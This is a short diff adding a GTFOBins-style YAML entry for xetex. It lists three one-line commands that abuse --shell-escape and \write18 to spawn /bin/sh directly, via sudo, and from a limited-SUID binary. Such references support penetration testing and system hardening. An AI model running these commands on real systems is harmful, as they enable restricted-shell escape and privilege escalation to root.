@@ -1,0 +1,11 @@
+functions:
+shell:
+- code: |
+xetex --shell-escape '\write18{/bin/sh}nd'
+sudo:
+- code: |
+sudo xetex --shell-escape '\write18{/bin/sh}nd'
+limited-suid:
+- code: |
+./xetex --shell-escape '\write18{/bin/sh}nd'
+---
